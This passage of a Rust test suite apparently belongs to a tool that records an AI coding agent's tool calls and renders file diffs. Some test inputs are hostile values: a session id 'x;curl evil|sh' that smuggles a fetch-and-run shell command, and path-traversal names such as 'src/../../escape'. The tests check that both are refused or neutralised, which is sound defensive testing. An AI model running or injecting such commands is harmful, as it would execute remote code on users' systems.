        assert_eq!(
            kind_change(Executable, Regular),
            Some("no longer executable")
        );
        assert_eq!(kind_change(Executable, Symlink), Some("now a symlink"));
        assert_eq!(kind_change(Symlink, Regular), Some("no longer a symlink"));
        assert_eq!(kind_change(Regular, Regular), None);
        assert!(is_binary(b"a\0b") && !is_binary(b"text\n"));
    }

    #[test]
    fn invalid_paths_are_marked_and_never_diffed() {
        let blob = |byte: u8| ObjectId::from_bytes_or_panic(&[byte; 20]);
        let file = |byte| {
            Some(TreeFile {
                kind: FileKind::Regular,
                blob: blob(byte),
            })
        };
        let change = |path: &[u8]| FileChange {
            path: path.to_vec(),
            old: file(1),
            new: file(2),
        };
        // `..` is invalid everywhere, `aux.txt` only on Windows.
        let changes = [
            change(b"src/../../escape"),
            change(b"bad\xffname"),
            change(b".git/config"),
            change(b"aux.txt"),
            change(b"ok\xe2\x80\xaename"),
        ];
        let shown: Vec<(String, Option<&str>, bool)> = changes
            .iter()
            .map(ListedFile::new)
            .map(|file| (file.path, file.note, file.diffed))
            .collect();
        let invalid = Some("not a valid path on this system, not shown");
        let aux = if cfg!(windows) {
            ("aux.txt".to_owned(), invalid, false)
        } else {
            ("aux.txt".to_owned(), None, true)
        };
        assert_eq!(
            shown,
            [
                ("src/../../escape".to_owned(), invalid, false),
                (
                    "bad\u{FFFD}name".to_owned(),
                    Some("not valid UTF-8, not shown"),
                    false
                ),
                (".git/config".to_owned(), invalid, false),
                aux,
                ("ok<U+202E>name".to_owned(), None, true),
            ]
        );
    }

    /// A shadow store in a temporary directory.
    fn shadow() -> (tempfile::TempDir, ShadowStore) {
        let dir = tempfile::tempdir().unwrap();
        let owned = OwnedDir::open(dir.path()).unwrap();
        let token = Token::parse("0123456789abcdef0123456789abcdef").unwrap();
        let shadow = ShadowStore::init(&owned, &token).unwrap();
        (dir, shadow)
    }

    /// The diff output for files changed from `old` to `new` contents, with `budget`.
    fn diff_output(files: &[(&str, &[u8], &[u8])], budget: Budget) -> (String, bool) {
        let (_dir, shadow) = shadow();
        let mut out = Vec::new();
        let mut writer = DiffWriter {
            out: &mut out,
            color: false,
            full: false,
            budget,
            truncated: false,
            diffed: Vec::new(),
        };
        for &(path, old, new) in files {
            let file = ListedFile {
                verb: "modified",
                relative: String::new(),
                path: path.to_owned(),
                note: None,
                old: Some(shadow.write_blob(old).unwrap()),
                new: Some(shadow.write_blob(new).unwrap()),
                diffed: true,
            };
            if !writer.file(&shadow, &file).unwrap() {
                break;
            }
        }
        let truncated = writer.truncated;
        (String::from_utf8(out).unwrap(), truncated)
    }

    #[test]
    fn the_read_budget_limits_how_much_content_is_diffed() {
        let budget = Budget {
            read_bytes: 20,
            ..SHORT_BUDGET
        };
        let (output, truncated) = diff_output(
            &[
                ("a.txt", b"12345\n", b"67890\n"),
                ("b.txt", b"abcde\n", b"fghij\n"),
                ("c.txt", b"abcde\n", b"fghij\n"),
            ],
            budget,
        );
        assert!(truncated);
        assert!(output.contains("+++ b/a.txt\n"), "{output}");
        assert!(output.contains("+++ b/b.txt\n"), "{output}");
        assert!(!output.contains("c.txt"), "{output}");
    }

    #[test]
    fn a_missing_blob_is_content_not_available() {
        let (_dir, shadow) = shadow();
        let mut out = Vec::new();
        let mut writer = DiffWriter {
            out: &mut out,
            color: false,
            full: false,
            budget: SHORT_BUDGET,
            truncated: false,
            diffed: Vec::new(),
        };
        let file = ListedFile {
            verb: "modified",
            relative: String::new(),
            path: "gone.txt".to_owned(),
            note: None,
            old: Some(ObjectId::from_bytes_or_panic(&[7; 20])),
            new: Some(shadow.write_blob(b"new\n").unwrap()),
            diffed: true,
        };
        assert!(writer.file(&shadow, &file).unwrap());
        assert!(!writer.truncated);
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "\ngone.txt: content not available\n"
        );
    }

    /// `lines` lines, each `a` or `b` at random (from `seed`): two such versions are the input that makes
    /// line diffs slowest.
    fn repetitive(lines: usize, seed: u64) -> Vec<u8> {
        let mut state = seed;
        (0..lines)
            .map(|_| {
                state = state
                    .wrapping_mul(6_364_136_223_846_793_005)
                    .wrapping_add(1_442_695_040_888_963_407);
                if state >> 63 == 0 { "a\n" } else { "b\n" }
            })
            .collect::<String>()
            .into_bytes()
    }

    #[test]
    fn large_and_repetitive_files_are_diffed_quickly_or_not_at_all() {
        let budget = SHORT_BUDGET;
        // Just under the line limit: diffed, within a bounded time.
        let (old, new) = (
            repetitive(budget.file_lines - 1, 1),
            repetitive(budget.file_lines - 1, 2),
        );
        let started = std::time::Instant::now();
        let (output, truncated) = diff_output(&[("near.txt", &old, &new)], budget);
        let elapsed = started.elapsed();
        assert!(truncated, "the output budget cuts it");
        assert!(output.contains("+++ b/near.txt"), "{output}");
        assert!(
            elapsed < std::time::Duration::from_secs(if cfg!(debug_assertions) { 60 } else { 5 }),
            "{elapsed:?}"
        );

        // Over the line or byte limit: a note, without diffing.
        let (old, new) = (
            repetitive(budget.file_lines + 1, 0),
            repetitive(budget.file_lines + 1, 1),
        );
        let long_line = vec![b'x'; budget.file_bytes + 1];
        let started = std::time::Instant::now();
        let (output, truncated) = diff_output(
            &[
                ("many_lines.txt", &old, &new),
                ("big.txt", b"x\n", &long_line),
            ],
            budget,
        );
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
        assert!(!truncated);
        assert_eq!(
            output,
            "\nmany_lines.txt: too large to diff\n\nbig.txt: too large to diff\n"
        );
    }

    #[test]
    fn diffs_follow_git_conventions() {
        let (output, _) = diff_output(
            &[("a.txt", b"one\ntwo\nthree", b"one\n2\nthree\nfour\n")],
            SHORT_BUDGET,
        );
        assert_eq!(
            output,
            "\n--- a/a.txt\n+++ b/a.txt\n@@ -1,3 +1,4 @@\n one\n-two\n-three\n\\ No newline at end of \
             file\n+2\n+three\n+four\n"
        );

        let (_dir, shadow) = shadow();
        let mut out = Vec::new();
        let mut writer = DiffWriter {
            out: &mut out,
            color: false,
            full: false,
            budget: SHORT_BUDGET,
            truncated: false,
            diffed: Vec::new(),
        };
        let added = ListedFile {
            verb: "added",
            relative: String::new(),
            path: "new.txt".to_owned(),
            note: None,
            old: None,
            new: Some(shadow.write_blob(b"x\ny\n").unwrap()),
            diffed: true,
        };
        assert!(writer.file(&shadow, &added).unwrap());
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "\n--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1,2 @@\n+x\n+y\n"
        );
    }

    #[test]
    fn file_tools_can_be_shown_by_their_path_with_only_their_error() {
        let (_dir, shadow) = shadow();
        let file = |content: &[u8]| crate::snapshot::Change::Upsert {
            path: "src/a.js".to_owned(),
            kind: FileKind::Regular,
            blob: shadow.write_blob(content).unwrap(),
        };
        let from = shadow
            .edit_tree(shadow.empty_tree(), &[file(b"old\n")])
            .unwrap();
        let to = shadow.edit_tree(from, &[file(b"new\n")]).unwrap();
        let tool = |tool: &str, success: bool, payload: Value| Event {
            session_id: "s1".to_owned(),
            step: 12,
            ts_ms: 0,
            kind: if success {
                "PostToolUse"
            } else {
                "PostToolUseFailure"
            }
            .to_owned(),
            tool_name: Some(tool.to_owned()),
            tool_use_id: None,
            agent_id: None,
            success: Some(success),
            tree_id: Some(to.to_string()),
            base_tree_id: Some(from.to_string()),
            files_changed: Some(1),
            payload,
        };
        let input = serde_json::json!({"file_path": "/p/src/a.js", "old_string": "old", "new_string": "new"});
        let edit = tool(
            "Edit",
            true,
            serde_json::json!({"tool_input": input, "duration_ms": 30,
                "tool_response": {"filePath": "/p/src/a.js", "userModified": false}}),
        );
        let failed = tool(
            "Edit",
            false,
            serde_json::json!({"tool_input": input, "duration_ms": 5, "error": "String not found"}),
        );
        let bash = tool(
            "Bash",
            true,
            serde_json::json!({"tool_input": {"command": "sed -i s/old/new/ src/a.js"},
                "tool_response": {"stdout": "done", "stderr": ""}}),
        );
        let roots = ["/p".to_owned()];
        let render = |event: &Event, file_tools_by_path: bool, session: &str| {
            let view = StepView {
                event,
                session,
                steps: 20,
                prompt: None,
                roots: &roots,
                time_zone: &TimeZone::UTC,
            };
            let changes = Changes::Between {
                shadow: &shadow,
                from,
                to,
            };
            let format = Format {
                file_tools_by_path,
                ..Format::default()
            };
            let mut out = Vec::new();
            write_step(&mut out, &view, changes, format).unwrap();
            String::from_utf8(out).unwrap()
        };
        let hint = "`yalper show 12 --session s1` shows its full input and output.\n";

        let shown = render(&edit, true, "s1");
        assert!(
            shown.contains(&format!(
                "\nEdit src/a.js, succeeded in 30 ms\n{hint}\n1 file changed:"
            )),
            "{shown}"
        );
        assert!(shown.contains("-old\n+new\n"), "{shown}");
        for left_out in ["Input:", "Output:", "old_string", "userModified"] {
            assert!(!shown.contains(left_out), "{shown}");
        }
        let shown = render(&failed, true, "s1");
        assert!(
            shown.contains(&format!(
                "\nEdit src/a.js, FAILED after 5 ms\n{hint}\nError:\n  String not found\n"
            )),
            "{shown}"
        );
        assert!(!shown.contains("Input:"), "{shown}");
        // Other tools, and file tools without the option, keep their input and output.
        let shown = render(&bash, true, "s1");
        assert!(
            shown.contains("Command:\n  sed -i s/old/new/ src/a.js\n\nOutput:\n  done\n"),
            "{shown}"
        );
        assert!(!shown.contains("yalper show"), "{shown}");
        let shown = render(&edit, false, "s1");
        assert!(
            shown.contains("\nEdit, succeeded in 30 ms\n\nInput:\n"),
            "{shown}"
        );
        assert!(shown.contains("\"userModified\": false"), "{shown}");
        assert!(!shown.contains("yalper show"), "{shown}");

        // Every file tool is found by the input key that names its file.
        let write = tool(
            "Write",
            true,
            serde_json::json!({"tool_input": {"file_path": "/p/src/a.js", "content": "new\n"},
                "duration_ms": 3}),
        );
        let notebook = tool(
            "NotebookEdit",
            true,
            serde_json::json!({"tool_input": {"notebook_path": "/p/src/a.js", "new_source": "new"},
                "duration_ms": 7}),
        );
        for (event, line) in [
            (&write, "\nWrite src/a.js, succeeded in 3 ms\n"),
            (&notebook, "\nNotebookEdit src/a.js, succeeded in 7 ms\n"),
        ] {
            let shown = render(event, true, "s1");
            assert!(shown.contains(&format!("{line}{hint}")), "{shown}");
            assert!(!shown.contains("Input:"), "{shown}");
        }

        // A long path keeps its file name.
        let deep = format!("/p/{}a.js", "folder/".repeat(40));
        let long = tool(
            "Edit",
            true,
            serde_json::json!({"tool_input": {"file_path": deep}, "duration_ms": 30}),
        );
        let shown = render(&long, true, "s1");
        assert!(
            shown.contains("\nEdit ...") && shown.contains("folder/a.js, succeeded in 30 ms\n"),
            "{shown}"
        );

        // A session id that a shell could run, or that was cut, is not put in the command to copy.
        let placeholder = "`yalper show 12 --session <session>` shows its full input and output; `yalper log \
                           --all` lists the sessions.\n";
        for session in ["x;curl evil|sh", "5f3c2a1e...", "a b", ""] {
            let shown = render(&edit, true, session);
            assert!(shown.contains(placeholder), "{shown}");
            assert!(!shown.contains(&format!("--session {session}`")), "{shown}");
        }
    }
}
